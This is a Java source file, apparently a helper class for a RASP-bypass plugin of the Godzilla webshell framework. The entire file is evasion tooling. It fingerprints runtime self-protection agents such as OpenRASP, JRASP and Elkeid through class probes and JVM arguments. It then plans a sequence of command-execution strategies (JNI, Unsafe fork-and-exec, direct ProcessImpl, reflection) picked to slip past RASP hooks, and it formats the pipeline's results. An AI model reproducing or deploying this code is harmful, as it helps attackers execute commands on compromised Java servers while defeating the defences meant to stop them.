package shells.plugins.java.assets;

import java.util.ArrayList;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;

/**
 * Detect + Plan + pipeline text helpers for RaspBypassModule.
 * Keep FQN under shells.plugins.java.assets; include as RaspDetectPlan.classs before Module.
 */
public final class RaspDetectPlan {

    private RaspDetectPlan() {
    }

    public static boolean isBenignGodzillaRaspPluginClass(String className) {
        if (className == null) {
            return true;
        }
        return className.contains("RaspBypassModule")
                || className.contains("RaspBypassUtils")
                || className.contains("RaspNativeLoader")
                || className.contains("RaspDetectPlan");
    }

    public static List<String> detectRaspVendors() {
        List<String> found = new ArrayList<String>();
        String[][] table = new String[][]{
                // OpenRASP: multiple class fingerprints (version drift)
                {"OpenRASP", "com.baidu.openrasp.HookHandler"},
                {"OpenRASP", "com.baidu.openrasp.EngineBoot"},
                {"OpenRASP", "com.baidu.openrasp.plugin.checker.CheckParameter"},
                {"OpenRASP", "com.baidu.openrasp.config.Config"},
                {"JRASP", "com.jrasp.agent.AgentLauncher"},
                {"Elkeid", "com.bytedance.elkeid.agent.Agent"},
                {"TencentRASP", "com.tencent.rasp.agent.RaspAgent"},
                {"AliyunRASP", "com.aliyun.rasp.agent.AgentMain"},
                {"QingTeng", "com.qingteng.rasp.agent.AgentBootstrap"},
                {"OASEC", "io.oasec.rasp.Agent"},
                {"Immune", "com.immunesecurity.rasp.Agent"}
        };
        for (String[] row : table) {
            try {
                Class.forName(row[1]);
                if (!found.contains(row[0])) {
                    found.add(row[0]);
                }
            } catch (Throwable ignored) {
            }
        }
        try {
            List<String> args = java.lang.management.ManagementFactory.getRuntimeMXBean().getInputArguments();
            for (String a : args) {
                if (a == null) {
                    continue;
                }
                String al = a.toLowerCase(Locale.ROOT);
                if (al.contains("javaagent") && (al.contains("rasp") || al.contains("openrasp"))) {
                    if (al.contains("openrasp") && !found.contains("OpenRASP")) {
                        found.add("OpenRASP");
                    } else if (!found.contains("javaagent-rasp")) {
                        found.add("javaagent-rasp");
                    }
                }
            }
        } catch (Throwable ignored) {
        }
        return found;
    }

    public static boolean detectRaspStackHint() {
        try {
            StackTraceElement[] stack = Thread.currentThread().getStackTrace();
            for (StackTraceElement element : stack) {
                String className = element.getClassName();
                if (isBenignGodzillaRaspPluginClass(className)) {
                    continue;
                }
                String cn = className.toLowerCase(Locale.ROOT);
                if (cn.contains("openrasp") || cn.contains("jrasp") || cn.contains("elkeid")
                        || cn.contains(".rasp.") || cn.contains("rasp.agent")
                        || cn.contains("hookhandler") || cn.contains("raspagent")) {
                    return true;
                }
            }
            return false;
        } catch (Exception e) {
            return false;
        }
    }

    public static boolean hasVendorRasp() {
        return !detectRaspVendors().isEmpty();
    }

    public static String detectSummaryLine(boolean jniLoaded) {
        StringBuilder sb = new StringBuilder();
        sb.append("os=").append(System.getProperty("os.name", "?"));
        sb.append(" arch=").append(System.getProperty("os.arch", "?"));
        sb.append(" java=").append(System.getProperty("java.version", "?"));
        sb.append(" jniLoaded=").append(jniLoaded);
        List<String> v = detectRaspVendors();
        sb.append(" rasp=").append(v.isEmpty() ? "none" : v.toString());
        return sb.toString();
    }

    /**
     * Strategy indices: 1 Unsafe, 2 JNI, 3 Thread, 4 GC, 5 ProcessImpl,
     * 6 TomcatJni, 7 ReflectSoft, 8 ForkAndExec, 9 ProcessBuilder.
     */
    public static List<Integer> planStrategies(boolean hasRasp, boolean jniReady) {
        List<Integer> plan = new ArrayList<Integer>();
        // 2 JNI, 1 Unsafe, 8 Fork, 5 ProcessImpl, 7 Reflect, 3 Thread, 6 TomcatJni, 4 GC, 9 ProcessBuilder
        if (jniReady) {
            plan.add(Integer.valueOf(2));
        }
        if (hasRasp) {
            // Prefer paths that avoid ProcessBuilder/Runtime hooks used by OpenRASP-like agents
            plan.add(Integer.valueOf(5)); // ProcessImplDirect
            plan.add(Integer.valueOf(1)); // UnsafeForkAndExec (Unix) / ProcessImpl on Win
            plan.add(Integer.valueOf(8)); // ForkAndExec
            plan.add(Integer.valueOf(3)); // NewThread (sometimes escapes request-thread checkers)
            plan.add(Integer.valueOf(7)); // ReflectSoftNormal
            plan.add(Integer.valueOf(6)); // TomcatJni
            plan.add(Integer.valueOf(4)); // GcFinalize
            plan.add(Integer.valueOf(9)); // ProcessBuilder last
        } else {
            plan.add(Integer.valueOf(9));
            plan.add(Integer.valueOf(7));
            plan.add(Integer.valueOf(5));
            plan.add(Integer.valueOf(1));
            plan.add(Integer.valueOf(3));
            plan.add(Integer.valueOf(6));
            plan.add(Integer.valueOf(8));
            plan.add(Integer.valueOf(4));
        }
        return new ArrayList<Integer>(new LinkedHashSet<Integer>(plan));
    }

    public static String strategyNameOf(int methodIndex) {
        switch (methodIndex) {
            case 1:
                return "UnsafeForkAndExec";
            case 2:
                return "JniNative";
            case 3:
                return "NewThread";
            case 4:
                return "GcFinalize";
            case 5:
                return "ProcessImplDirect";
            case 6:
                return "TomcatJni";
            case 7:
                return "ReflectSoftNormal";
            case 8:
                return "ForkAndExec";
            case 9:
                return "ProcessBuilder";
            default:
                return "Auto";
        }
    }

    public static String planToNames(List<Integer> plan) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < plan.size(); i++) {
            if (i > 0) {
                sb.append('>');
            }
            sb.append(strategyNameOf(plan.get(i).intValue()));
        }
        return sb.toString();
    }

    public static String verifyEchoCommand(String token) {
        String os = System.getProperty("os.name", "").toLowerCase(Locale.ROOT);
        if (os.contains("win")) {
            return "cmd.exe /c echo " + token;
        }
        return "echo " + token;
    }

    public static String escapeJson(String s) {
        if (s == null) {
            return "";
        }
        return s.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "");
    }

    public static String abbreviate(String s, int max) {
        if (s == null) {
            return "";
        }
        String t = s.replace('\r', ' ').replace('\n', ' ').trim();
        if (t.length() <= max) {
            return t;
        }
        return t.substring(0, max) + "...";
    }

    public static String formatPipelineResult(boolean ok, String code, String strategy,
                                              String detect, List<String> tried, String body, String nextHint) {
        StringBuilder sb = new StringBuilder();
        sb.append("=== RASP Pipeline ===\n");
        sb.append("ok=").append(ok).append(" code=").append(code);
        if (strategy != null) {
            sb.append(" strategy=").append(strategy);
        }
        sb.append('\n');
        if (detect != null) {
            sb.append("detect: ").append(detect).append('\n');
        }
        if (tried != null && !tried.isEmpty()) {
            sb.append("tried: ").append(tried).append('\n');
        }
        if (nextHint != null) {
            sb.append("next: ").append(nextHint).append('\n');
        }
        sb.append("----------------------------------------\n");
        if (body != null) {
            sb.append(body);
            if (!body.endsWith("\n")) {
                sb.append('\n');
            }
        }
        sb.append("<!--RASP_META:{");
        sb.append("\"ok\":").append(ok);
        sb.append(",\"code\":\"").append(escapeJson(code)).append('"');
        if (strategy != null) {
            sb.append(",\"strategy\":\"").append(escapeJson(strategy)).append('"');
        }
        sb.append(",\"tried\":\"").append(escapeJson(String.valueOf(tried))).append('"');
        sb.append("}-->\n");
        return sb.toString();
    }

    public static boolean looksLikeExecFailure(byte[] out) {
        if (out == null || out.length == 0) {
            return true;
        }
        int n = Math.min(out.length, 480);
        String head = new String(out, 0, n);
        String h = head.toLowerCase(Locale.ROOT);
        if (h.startsWith("normal exec error")
                || h.startsWith("error:")
                || h.startsWith("unsafe")
                || h.startsWith("forkandexec error")
                || h.startsWith("processimpl")
                || h.startsWith("reflection bypass error")
                || h.startsWith("jni")
                || h.startsWith("tomcat")
                || h.startsWith("gc finalize")
                || h.startsWith("new thread")) {
            if (h.contains("error") || h.contains("fail") || h.contains("not found")
                    || h.contains("exception") || h.contains("not loaded")) {
                return true;
            }
        }
        return h.contains("securityexception")
                || h.contains("blocked by rasp")
                || h.contains("accesscontrol")
                || h.contains("not available")
                || h.contains("library not found")
                || h.contains("timeout")
                || h.contains("no output capture")
                || (h.contains("openrasp") && h.contains("block"));
    }
}
